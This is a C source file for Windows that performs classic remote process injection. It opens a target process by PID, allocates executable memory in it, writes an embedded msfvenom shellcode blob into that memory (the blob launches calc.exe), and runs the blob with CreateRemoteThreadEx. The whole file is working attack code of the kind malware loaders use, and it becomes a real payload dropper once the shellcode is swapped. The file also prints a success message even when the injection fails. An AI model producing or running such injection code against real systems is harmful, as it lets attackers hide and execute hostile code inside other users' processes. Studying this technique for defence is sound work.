#include <Windows.h>
#include <stdio.h>

DWORD PID , TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;
unsigned char poop[] = 
	/* Shellcode of calc.exe generated using msfvenom */
	"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
	"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
	"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
	"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
	"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
	"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
	"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
	"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
	"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
	"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
	"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
	"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
	"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
	"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
	"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
	"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

int main(int argc, char* argv[]) {

	/* If statement for the usage of program */

	if (argc < 2) {
		printf("\n[!] Usage: Program.exe <PID>\n");
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);

	/* Opening a process */
	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		PID
	);
	printf("\n[+] Trying to open a handle in the process %d\n",PID);
	Sleep(1000);
	printf("[+] Got a handle to the process at 0x%p\n", hProcess);

	if (hProcess == NULL) {
		printf("[!] Failed to get a handle to the process %ld. Error %ld\n", PID, GetLastError());
		return EXIT_FAILURE;
	}

	/* Allocating the memory */
	rBuffer = VirtualAllocEx(
		hProcess,
		NULL,
		sizeof(poop),
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE
	);
	printf("[+] Attempting to allocate memory \n");
	Sleep(3000);
	printf("[+] Successfully allocated memory!\n");

	if (rBuffer == NULL) {
		printf("[!] memory allocation failed!!\n");
		return EXIT_FAILURE;
	}

	/* Writing into the memory */
	WriteProcessMemory(
		hProcess,
		rBuffer,
		poop,
		sizeof(poop),
		NULL
	);
	printf("[!] Attempting to write shellcode into the memory..\n");
	Sleep(2500);
	printf("[+] Shellcode successfully written into the memory\n");

	/* CreateRemoteThreadEx() to execute the shellcode  */
	hThread = CreateRemoteThreadEx(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		0,
		NULL,
		&TID
	);
	printf("[!] Attempting to create a thread for execution..\n");
	Sleep(3000);
	printf("[+] Thread successfully created!\n");
	Sleep(2000);
	printf("[+] Executing the shellcode\n");

	if (hThread == NULL) {
		printf("[!] Failed to create a thread. Error %ld\n", GetLastError());
		printf("[!] Shellcode injection Failed!");
	}

	CloseHandle(hProcess);
	CloseHandle(hThread);
	printf("[+] Shellcode injection into remote process was successfull.\n");
	return EXIT_SUCCESS;

}
